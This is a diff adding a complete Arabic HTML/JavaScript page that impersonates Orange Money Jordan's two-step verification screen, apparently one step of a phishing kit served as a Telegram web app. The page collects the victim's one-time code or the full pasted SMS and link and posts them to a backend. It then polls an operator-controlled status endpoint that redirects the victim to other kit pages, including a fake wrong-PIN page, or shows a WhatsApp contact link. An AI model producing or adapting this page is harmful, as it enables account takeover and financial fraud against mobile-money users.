@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>اورنج موني الأردن - التحقق من الرمز</title>
+    
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --orange-primary: #ff6600;
+            --orange-gradient: linear-gradient(180deg, #ff7700 0%, #ff6600 100%);
+            --bg-color: #f7f7f7;
+            --card-bg: #ffffff;
+            --text-dark: #111111;
+            --text-muted: #666666;
+            --border-orange: #ff6600;
+            --btn-disabled-bg: #e0e0e0;
+            --btn-disabled-text: #999999;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif, -apple-system, BlinkMacSystemFont;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+            direction: rtl;
+        }
+
+        .header-box {
+            width: 100%;
+            background: var(--orange-gradient);
+            padding: 25px 20px 40px 20px;
+            color: white;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        .main-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin-top: -20px;
+            flex-grow: 1;
+        }
+
+        .card {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 400px;
+            padding: 30px 25px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            align-self: flex-start;
+        }
+
+        h2 {
+            margin: 0 0 12px 0;
+            font-size: 22px;
+            color: var(--text-dark);
+            font-weight: 800;
+            line-height: 1.2;
+        }
+
+        .instruction {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin: 0 0 10px 0;
+            line-height: 1.4;
+        }
+
+        .phone-number {
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            direction: ltr; /* Keeps prefix and number format consistent */
+        }
+
+        /* 4-Digit OTP Code Inputs */
+        .otp-section {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .otp-label {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 12px;
+        }
+
+        .otp-input-group {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 16px;
+            direction: ltr; /* Left-to-right digit sequence */
+        }
+
+        .otp-box {
+            width: 52px;
+            height: 54px;
+            border: 2px solid var(--border-orange);
+            border-radius: 10px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            outline: none;
+            background-color: #ffffff;
+            transition: border-color 0.2s;
+        }
+
+        .otp-box:focus {
+            border-width: 2.5px;
+        }
+
+        textarea {
+            width: 100%;
+            height: 80px;
+            border: 1.5px solid #dcdcdc;
+            border-radius: 10px;
+            padding: 10px;
+            font-size: 13px;
+            outline: none;
+            resize: none;
+            font-family: inherit;
+            color: #333333;
+            background-color: #fafafa;
+        }
+
+        textarea:focus {
+            border-color: var(--orange-primary);
+            background-color: #ffffff;
+        }
+
+        textarea::placeholder {
+            color: #aaaaaa;
+        }
+
+        .resend-text {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 14px;
+            margin: 20px 0;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: var(--btn-disabled-bg);
+            color: var(--btn-disabled-text);
+            border: none;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: not-allowed;
+            letter-spacing: 0.5px;
+            transition: background-color 0.2s;
+        }
+
+        .submit-btn.active {
+            background-color: var(--orange-primary);
+            color: white;
+            cursor: pointer;
+        }
+
+        .submit-btn.active:hover {
+            background-color: #e05500;
+        }
+
+        .footer-banner {
+            width: 100%;
+            background: var(--orange-gradient);
+            height: 80px;
+            border-top-left-radius: 50% 30px;
+            border-top-right-radius: 50% 30px;
+            margin-top: 40px;
+        }
+
+        /* ✅ Fullsize Screen Overlay Styles */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            min-height: 100vh;
+            background: var(--orange-gradient);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+            text-align: center;
+            padding: 24px;
+        }
+
+        .overlay-card {
+            width: 100%;
+            max-width: 360px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .spinner {
+            width: 56px;
+            height: 56px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay-title {
+            font-size: 22px;
+            font-weight: 800;
+            margin-bottom: 12px;
+            color: white;
+        }
+
+        .overlay-desc {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #ffffff;
+            line-height: 1.4;
+        }
+
+        .wa-btn {
+            display: block;
+            width: 100%;
+            background-color: white;
+            color: var(--orange-primary);
+            font-weight: 800;
+            padding: 16px;
+            border-radius: 12px;
+            text-decoration: none;
+            word-break: break-all;
+            font-size: 13px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+        }
+
+        .error-message {
+            color: #e74c3c;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
+            font-weight: 600;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="header-box">
+    اورنج موني الأردن
+</div>
+
+<div class="main-container">
+    <div class="card">
+        <h2>التحقق بخطوتين</h2>
+
+        <p class="instruction">
+            أدخل رمز التحقق المكون من 4 أرقام الذي تم إرساله إلى رقم اورنج موني الخاص بك:
+        </p>
+
+        <div class="phone-number">
+            <span>🇯🇴</span>
+            <span id="displayPhone">+962 ...</span>
+        </div>
+
+        <!-- 4-Digit OTP Code Inputs -->
+        <div class="otp-section">
+            <div class="otp-label">رمز التحقق (4 أرقام)</div>
+            <div class="otp-input-group">
+                <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+                <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+                <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+                <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+            </div>
+        </div>
+
+        <textarea id="smsInput" placeholder="أو قم بلصق الرسالة النصية / الرابط الكامل هنا..."></textarea>
+        <div id="errorText" class="error-message">الرمز أو الرابط غير صحيح أو انتهت صلاحيته. يرجى استخدام أحدث رمز تم استلامه.</div>
+
+        <div class="resend-text" id="timerBox">
+            إعادة الإرسال خلال <span id="timer">60</span> ثانية
+        </div>
+
+        <button id="submitBtn" class="submit-btn" disabled>تأكيد الرمز</button>
+    </div>
+</div>
+
+<div class="footer-banner"></div>
+
+<!-- ✅ Fullscreen Loading Overlay -->
+<div class="overlay" id="statusOverlay">
+    <div class="overlay-card">
+        <div class="spinner"></div>
+        <div class="overlay-title">يرجى الانتظار...</div>
+    </div>
+</div>
+
+<!-- ✅ Fullscreen WhatsApp Contact Overlay -->
+<div class="overlay" id="contactOverlay">
+    <div class="overlay-card">
+        <div class="overlay-title">تواصل معنا عبر واتساب</div>
+        <div class="overlay-desc">اضغط على الرابط التالي للتواصل معنا عبر واتساب</div>
+        <a href="https://wa.me/message/ICY6YKSAAG3GC1" target="_blank" class="wa-btn">
+            https://wa.me/message/ICY6YKSAAG3GC1
+        </a>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const displayPhone = document.getElementById('displayPhone');
+    const otpBoxes = document.querySelectorAll('.otp-box');
+    const smsInput = document.getElementById('smsInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const timerEl = document.getElementById('timer');
+    const timerBox = document.getElementById('timerBox');
+    const statusOverlay = document.getElementById('statusOverlay');
+    const contactOverlay = document.getElementById('contactOverlay');
+    const errorText = document.getElementById('errorText');
+
+    let checkInterval = null;
+
+    // Load registered phone number (Jordan +962)
+    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone');
+    if (savedPhone) {
+        displayPhone.textContent = `+962 ${savedPhone.replace(/^\+?962/, '')}`;
+    } else {
+        displayPhone.textContent = "+962 ...";
+    }
+
+    // Auto-focus and digit handling for the 4 OTP boxes
+    otpBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.replace(/\D/g, '');
+
+            if (box.value && index < otpBoxes.length - 1) {
+                otpBoxes[index + 1].focus();
+            }
+
+            checkInputs();
+        });
+
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) {
+                otpBoxes[index - 1].focus();
+            }
+        });
+    });
+
+    // Auto extract 4-digit code from full SMS if pasted into text area
+    smsInput.addEventListener('input', () => {
+        const text = smsInput.value;
+        const matched = text.match(/\b\d{4}\b/);
+        if (matched) {
+            const digits = matched[0].split('');
+            otpBoxes.forEach((box, i) => {
+                box.value = digits[i] || '';
+            });
+        }
+        checkInputs();
+    });
+
+    function checkInputs() {
+        const isOtpFilled = [...otpBoxes].every(b => b.value.length === 1);
+        const hasText = smsInput.value.trim().length > 0;
+        const valid = isOtpFilled || hasText;
+
+        submitBtn.disabled = !valid;
+        submitBtn.classList.toggle('active', valid);
+        errorText.style.display = 'none';
+    }
+
+    // Countdown Timer
+    let timeLeft = 60;
+    const timerInterval = setInterval(() => {
+        timeLeft--;
+        if (timerEl) timerEl.textContent = timeLeft;
+
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            timerBox.innerHTML = '<span style="color:var(--orange-primary); cursor:pointer; font-weight:700;" onclick="location.reload()">إعادة إرسال الرمز</span>';
+        }
+    }, 1000);
+
+    // Backend status polling
+    function startStatusPolling() {
+        if (checkInterval) clearInterval(checkInterval);
+
+        checkInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
+                const data = await res.json();
+
+                // Direct to page 9 on approval
+                if (data.status === "otp1_correct" || data.status === "approved") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page9";
+                } 
+                // Return to page 6 on wrong PIN
+                else if (data.status === "otp2_wrongpin" || data.status === "pin_wrong") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page6?error=wrongpin";
+                } 
+                // Incorrect SMS Code/Link handle
+                else if (data.status === "otp1_wrong") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "none";
+                    errorText.textContent = "الرمز أو الرابط غير صحيح أو انتهت صلاحيته. يرجى استخدام أحدث رمز تم استلامه.";
+                    errorText.style.display = "block";
+                    smsInput.value = "";
+                    otpBoxes.forEach(b => b.value = "");
+                    submitBtn.disabled = true;
+                    submitBtn.classList.remove('active');
+                } 
+                // Show WhatsApp Overlay
+                else if (data.status === "contact_us") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "flex";
+                }
+            } catch (err) {
+                console.error("Status check error:", err);
+            }
+        }, 2000);
+    }
+
+    // Submission handler
+    submitBtn.addEventListener('click', async () => {
+        if (submitBtn.disabled) return;
+
+        let code = "";
+        otpBoxes.forEach(b => code += b.value);
+
+        const pastedLink = smsInput.value.trim();
+        const payload = pastedLink ? `${code} | ${pastedLink}` : code;
+
+        if (!payload) return;
+
+        contactOverlay.style.display = "none";
+        statusOverlay.style.display = "flex";
+        errorText.style.display = "none";
+
+        try {
+            const res = await fetch('/api/verify-first-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: savedPhone,
+                    link: payload
+                })
+            });
+
+            const responseData = await res.json();
+            if (responseData.success) {
+                startStatusPolling();
+            } else {
+                statusOverlay.style.display = "none";
+                alert("حدث خطأ أثناء الإرسال.");
+            }
+        } catch (err) {
+            console.error("Submission error:", err);
+            statusOverlay.style.display = "none";
+            alert("تعذر الاتصال بالخادم.");
+        }
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+
+</body>
+</html>
